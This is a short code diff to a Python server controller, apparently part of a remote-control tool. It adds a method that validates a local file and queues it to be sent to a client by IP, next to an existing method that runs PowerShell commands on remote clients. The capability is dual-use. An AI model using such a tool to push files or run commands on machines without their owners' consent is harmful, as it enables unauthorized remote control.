@@ -6,6 +6,9 @@ from Server.View.Server_View import View
 from Server.Model.Server_Model import ServerModel
 from Server.commands import Commands
 
+import os
+
+
 
 class Controller:
 
@@ -30,6 +33,25 @@ class Controller:
     def on_powershell(self, ip: str, args: str):
         self._commands.powershell(ip, args)
 
+    def on_file_to_send(self, ip: str, file_path: str):
+        if not file_path:
+            return
+        if not os.path.exists(file_path):
+            return
+        if not os.path.isfile(file_path):
+            return
+
+        file_name = os.path.basename(file_path)
+        file_type = os.path.splitext(file_name)[1]
+
+        try:
+            file_size = os.path.getsize(file_path)
+        except OSError as e:
+            return
+
+        self._model.queue_file_to_send(ip, file_path)
+        self._commands.file_to_send(ip, file_name, file_type, file_size)
+        print(f"[Controller] Команду file_to_send створено для {ip}: {file_name}, {file_size} байт")
     def _refresh_loop(self):
         while not self._stop_event.wait(config.REFRESH_SEC):
             clients = self._get_all_clients()
